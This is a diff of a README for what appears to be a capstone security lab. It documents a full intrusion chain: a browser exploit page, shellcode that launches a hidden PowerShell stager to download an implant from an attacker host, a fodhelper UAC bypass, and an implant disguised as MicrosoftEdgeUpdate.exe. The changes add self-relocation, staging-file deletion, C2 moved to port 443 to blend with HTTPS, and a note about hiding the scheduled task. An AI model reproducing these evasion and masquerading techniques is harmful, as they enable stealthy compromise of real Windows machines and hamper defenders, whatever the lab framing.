@@ -1,11 +1,5 @@
 # Capstone Docker Lab — Milestone 2
 
-## Reminder
-
-Binary hygiene (stripped binary, non-obvious names/paths), basic anti-RE/log hygiene (2
-pts); C2/exfil traffic encrypted and not obviously “C2” at a glance (1 pt).Need to implement this as we need to change the file path to be stored in program files x86 Microsoft Edge instead of C:/Users/i.exe also rename the implant to MicrosoftEdgeUpdate.exe, also try ot hid hte implant from the scheduled tasks, maybe in the kernel? Also fix up comments
-
-install nasm
 
 ## Exploit Plan
 
@@ -285,18 +279,28 @@ Even with mTLS, a network observer can do **traffic analysis** — inferring ope
 3. Shellcode → WinExec(powershell -w h -nop -c "...")
    ├── [Net.ServicePointManager]::SecurityProtocol = Tls12     ← force TLS 1.2 for .NET WebClient
    ├── ServerCertificateValidationCallback = {$true}           ← bypass self-signed nginx cert
-   ├── DownloadFile('https://<HOST_IP>/update/<DOWNLOAD_TOKEN>', 'C:\Users\Public\i.exe')
+   ├── DownloadFile('https://<HOST_IP>:8443/update/<DOWNLOAD_TOKEN>', 'C:\Users\Public\i.exe')
    │   └── nginx → token_server.js: constant-time compare → burn token → serve MicrosoftEdgeUpdate.exe
    ├── Write HKCU ms-settings fodhelper registry key → i.exe
    ├── Start fodhelper.exe (auto-elevates, runs i.exe as Administrator)
    └── Remove registry key (cleanup)
 
-4. i.exe (implant) starts — no console window (-mwindows)
+4. i.exe (implant) starts at high-integrity — no console window (-mwindows)
    │
-   ├── [First run] %APPDATA%\MicrosoftEdge\ec.dat not found → enrollment:
+   ├── [Self-relocation — first run only]
+   │   ├── GetModuleFileName → currently C:\Users\Public\i.exe (not the install path)
+   │   ├── CreateDirectory C:\Program Files (x86)\Microsoft\EdgeUpdate\
+   │   ├── CopyFile → MicrosoftEdgeUpdate.exe
+   │   ├── CreateProcess("MicrosoftEdgeUpdate.exe --relocated", CREATE_NO_WINDOW)
+   │   └── Exit — i.exe process terminates and becomes deletable
+   │
+   ├── [Relocated copy starts with --relocated arg]
+   │   └── DeleteFile(C:\Users\Public\i.exe) — staging copy removed
+   │
+   ├── [First run] C:\Users\Public\MicrosoftEdge\ec.dat not found → enrollment:
    │   ├── Generate RSA-2048 keypair (EVP in memory)
    │   ├── Build CSR with CN = ENROLLMENT_TOKEN
-   │   ├── Connect to <HOST_IP>:4444 — one-way TLS (no client cert)
+   │   ├── Connect to <HOST_IP>:443 — one-way TLS (no client cert)
    │   ├── Send COMMAND_ENROLL_CSR (CSR bytes)
    │   │   └── Controller: verify CSR sig, validate CN == ENROLLMENT_TOKEN,
    │   │       sign 30-day cert, append serial to whitelist.txt, burn token
@@ -305,6 +309,7 @@ Even with mTLS, a network observer can do **traffic analysis** — inferring ope
    │   └── Reinit TLS with issued cert + in-memory key (tls_init_client_mem)
    │
    └── [Subsequent runs — reboot / scheduled task] ec.dat found → skip enrollment:
+       ├── Already at install path → self_relocate() is a no-op
        ├── CryptUnprotectData(ec.dat) → cert PEM
        ├── CryptUnprotectData(ek.dat) → key PEM
        └── tls_init_client_mem directly — no enrollment connection needed
@@ -330,7 +335,7 @@ Even with mTLS, a network observer can do **traffic analysis** — inferring ope
 - On startup: loads `certs/controller.crt`, `certs/controller.key`, `certs/ca.crt`, `certs/ca.key` from within the image
 - On enrollment connection (no client cert): validates CSR → signs cert → writes serial to whitelist → burns token
 - On normal mTLS connection: verifies cert chain → whitelist check → HELLO → command loop
-- Exposed port: `4444` (TCP, TLS 1.3)
+- Exposed port: `443` (TCP, TLS 1.3 — blends with normal HTTPS traffic)
 
 ### exfil-server
 
@@ -342,7 +347,25 @@ Built in **3 stages:**
 | 2 | `builder` | Builds `implant.exe` with baked-in ca.crt + HOST_IP + ENROLLMENT_TOKEN; patches shellcode array into `exploit.js`; renames to `MicrosoftEdgeUpdate.exe` |
 | 3 | runtime | nginx (port 443) + token_server (localhost:3000) + exploit site (port 8888) |
 
-Exposed ports: `443` (nginx HTTPS implant delivery), `8888` (CVE exploit page)
+Exposed ports: `8443` (nginx HTTPS implant delivery), `8888` (CVE exploit page)
+
+---
+
+## Implant Name Obfuscation
+
+The stager runs at **medium integrity** (browser renderer process) and cannot write to `C:\Program Files (x86)`. The implant handles its own relocation after the fodhelper UAC bypass elevates it to **high integrity**:
+
+| Step | Path | Actor |
+|---|---|---|
+| Download | `C:\Users\Public\i.exe` | PowerShell stager (medium integrity) |
+| Run | `i.exe` launched by fodhelper as Administrator | fodhelper UAC bypass |
+| Relocate | Copy self → `C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe` | `i.exe` (high integrity) |
+| Re-launch | `MicrosoftEdgeUpdate.exe --relocated` (CREATE_NO_WINDOW) | `i.exe` |
+| Cleanup | `DeleteFile(C:\Users\Public\i.exe)` | relocated copy |
+| Persist | Scheduled task points to the install path | operator via ENABLE PERSISTENCE |
+| Shutdown | `MoveFileExA(..., MOVEFILE_DELAY_UNTIL_REBOOT)` marks install exe for deletion | SHUTDOWN command |
+
+The `--relocated` command-line argument guards against re-entry: when the scheduled task relaunches the implant, `self_relocate()` detects it is already at the install path and skips immediately.
 
 ---
 
@@ -413,7 +436,7 @@ sudo ./launch.sh
 7. Run `certs/generate_certs.sh` — generates CA, controller cert, nginx cert, empty `whitelist.txt`, writes `implant_certs.h`
 8. Build shellcode: `make HOST_IP=... DOWNLOAD_TOKEN=...` → patches `stager.asm` → assembles `final_shellcode.bin`
 9. Stop any running lab containers
-10. Check for port conflicts on 4444, 443, 8888
+10. Check for port conflicts on 443, 8443, 8888
 11. Run `docker compose up --build -d`
 12. Verify both containers are running
 
@@ -466,7 +489,7 @@ ping <host-only-ip>
 | Mode | Why it won't work |
 |---|---|
 | Bridged | Depends on physical NIC — unreliable |
-| NAT | VM shares host IP — cannot reach HOST_IP:4444 directly |
+| NAT | VM shares host IP — cannot reach HOST_IP:443 directly |
 | Internal | VMs only, cannot reach Linux host |
 
 ---
@@ -545,3 +568,4 @@ Look for `Mandatory Label\High Mandatory Level`.
 | 12 | `platform.h`, `Makefile` | `_popen` creates visible `cmd.exe` window; binary shows console on launch | Replaced `_popen` with `CreateProcess(CREATE_NO_WINDOW)`; added `-mwindows` to linker flags |
 | 13 | `implant.c` | After reboot, persistence-triggered implant tries to re-enroll but single-use token is already consumed → connection rejected | Persist DPAPI-encrypted cert + key to `%APPDATA%\MicrosoftEdge\ec.dat`/`ek.dat`; load on startup and skip enrollment if present |
 | 14 | `implant.c` | Cert and key written to disk as plaintext PEM — raw private key visible to `strings`, AV, and portable to other machines | Wrap with `CryptProtectData`/`CryptUnprotectData` (Windows DPAPI) — blob is tied to the original user + machine |
+| 15 | `implant.c`, `controller.c` | Implant lived at `C:\Users\Public\i.exe` — obvious staging path, no masquerading | Two-stage relocation: stager drops `i.exe` (medium integrity); once elevated, implant copies itself to `C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe`, re-launches, and deletes the staging copy |
